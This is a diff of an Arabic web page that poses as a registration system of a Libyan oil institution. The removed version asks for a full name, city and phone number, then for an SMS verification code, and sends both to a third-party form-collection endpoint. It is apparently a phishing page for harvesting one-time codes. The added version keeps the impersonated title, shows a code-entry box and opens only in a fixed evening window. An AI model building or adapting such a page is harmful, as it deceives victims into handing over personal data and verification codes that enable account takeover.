@@ -1,222 +1,91 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنية</title>
-  <link rel="icon" href="uy.jpeg" type="image/png">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <title>التسجيل - المؤسسة الليبية للنفط</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
       font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #002147, #003366);
+      direction: rtl;
+      background-color: #f4f4f4;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
       margin: 0;
-      direction: rtl;
     }
 
     .container {
-      background: #fff;
-      border-radius: 20px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
-      padding: 35px 40px;
-      width: 96%;
-      max-width: 420px;
-      box-sizing: border-box;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
       text-align: center;
-      z-index: 1;
+      max-width: 400px;
     }
 
-    .logo-container {
-      text-align: center;
-      margin-bottom: 20px;
+    .hidden {
+      display: none;
     }
 
-    .logo-container img {
-      width: 150px;
-      height: 150px;
-      object-fit: contain;
-      margin: 0 auto;
-      display: block;
+    .error-message {
+      color: red;
+      font-size: 18px;
     }
 
-    .logo-container p {
-      margin-top: 8px;
-      font-weight: 700;
-      color: #003366;
+    input {
+      padding: 10px;
       font-size: 16px;
-    }
-
-    h2 {
-      margin-bottom: 25px;
-      color: #003366;
-      font-weight: 900;
-      font-family: Arial, Helvetica, sans-serif;
-      font-size: 32px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 600;
-      color: #222;
-      text-align: right;
-    }
-
-    input,
-    select {
       width: 100%;
-      padding: 12px 15px;
-      font-size: 16px;
-      border-radius: 10px;
-      border: 1.8px solid #bbb;
-      margin-bottom: 18px;
-      transition: border-color 0.3s ease;
-      box-sizing: border-box;
-      font-family: inherit;
-    }
-
-    input:focus,
-    select:focus {
-      border-color: #28a745;
-      outline: none;
-    }
-
-    input:disabled {
-      background-color: #f2f2f2;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
     }
 
     button {
-      width: 40%;
-      padding: 12px;
-      font-size: 17px;
       background-color: #28a745;
+      color: white;
+      padding: 12px 20px;
+      font-size: 16px;
       border: none;
-      border-radius: 10px;
-      color: #fff;
+      border-radius: 6px;
       cursor: pointer;
-      font-weight: bold;
-      font-family: Calibri, sans-serif;
-      transition: background-color 0.3s ease;
-      margin-bottom: 15px;
     }
 
-    button:hover:not(:disabled) {
+    button:hover {
       background-color: #218838;
-    }
-
-    .error {
-      color: red;
-      font-size: 14px;
-      margin-top: -10px;
-      margin-bottom: 15px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo-container">
-      <img src="uy.jpeg" alt="شعار المؤسسة" />
-      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
-    </div>
 
-    <div id="stepOne">
-      <h2>تسجيل الدخول</h2>
-      <form id="stepOneForm" onsubmit="return submitStepOne(event);">
-        <label for="fullname">الاسم الثلاثي:</label>
-        <input type="text" id="fullname" name="fullname" required pattern="[\u0600-\u06FF\s]{8,}" title="يجب أن يحتوي الاسم على 8 أحرف عربية على الأقل">
+  <div class="container" id="content" class="hidden">
+    <h2>ادخل الكود لتأكيد الدخول</h2>
+    <input type="text" placeholder="ادخل الكود هنا">
+    <button>تأكيد الدخول</button>
+  </div>
 
-        <label for="city">السكن:</label>
-        <select id="city" name="city" required>
-          <option value="">اختر المدينة</option>
-          <option>طرابلس</option>
-          <option>بنغازي</option>
-          <option>مصراتة</option>
-          <option>الزاوية</option>
-          <option>سبها</option>
-          <option>الخمس</option>
-          <option>زليتن</option>
-          <option>البيضاء</option>
-          <option>درنة</option>
-          <option>طبرق</option>
-        </select>
-
-        <label for="phone">رقم الهاتف:</label>
-        <input type="tel" id="phone" name="phone" required pattern="[0-9]{10,15}" title="يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً">
-
-        <button type="submit">أرسل البيانات</button>
-      </form>
-    </div>
-
-    <div id="stepTwo" style="display: none;">
-      <h2>أدخل الكود</h2>
-      <form id="stepTwoForm" onsubmit="return submitStepTwo(event);">
-        <label for="code">ادخل الكود:</label>
-        <input type="text" id="code" name="code" required placeholder="ادخل الكود المرسل عبر SMS">
-        <div id="errorMessage" class="error"></div>
-        <button type="submit">تأكيد الدخول</button>
-      </form>
-    </div>
-
+  <div class="container" id="error" class="hidden">
+    <h2 class="error-message">الصفحة متاحة فقط من الساعة 8 مساءً إلى 10 مساءً<br>طوال الأسبوع ما عدا يوم الجمعة.</h2>
   </div>
 
   <script>
-    function submitStepOne(e) {
-      e.preventDefault();
-      const fullname = document.getElementById('fullname').value;
-      const city = document.getElementById('city').value;
-      const phone = document.getElementById('phone').value;
+    // الحصول على الوقت والتاريخ الحالي
+    const now = new Date();
+    const hour = now.getHours(); // من 0 إلى 23
+    const day = now.getDay();    // الأحد = 0، الجمعة = 5
 
-      fetch('https://formcarry.com/s/12UxdOsTbaW', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({ fullname, city, phone })
-      })
-      .then(res => {
-        if (!res.ok) throw new Error('فشل في الإرسال');
-        document.getElementById('stepOne').style.display = 'none';
-        document.getElementById('stepTwo').style.display = 'block';
-      })
-      .catch(err => {
-        alert('حدث خطأ أثناء إرسال البيانات.');
-        console.error(err);
-      });
-    }
+    // الشرط: الوقت بين 20 و 22، واليوم ليس جمعة
+    const isOpenTime = hour >= 20 && hour < 22;
+    const isNotFriday = day !== 5;
 
-    function submitStepTwo(e) {
-      e.preventDefault();
-      const phone = document.getElementById('phone').value;
-      const code = document.getElementById('code').value;
-      const errorDiv = document.getElementById('errorMessage');
-      errorDiv.textContent = '';
-
-      fetch('https://formcarry.com/s/12UxdOsTbaW', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({ phone, code })
-      })
-      .then(async res => {
-        const data = await res.json();
-        if (res.ok && data.success !== false) {
-          window.location.href = 'success.html';
-        } else {
-          errorDiv.textContent = '❌ الكود غير صحيح. حاول مرة أخرى.';
-        }
-      })
-      .catch(err => {
-        errorDiv.textContent = '⚠️ تعذر الاتصال بالخادم';
-        console.error(err);
-      });
+    if (isOpenTime && isNotFriday) {
+      document.getElementById('content').style.display = 'block';
+    } else {
+      document.getElementById('error').style.display = 'block';
     }
   </script>
+
 </body>
 </html>
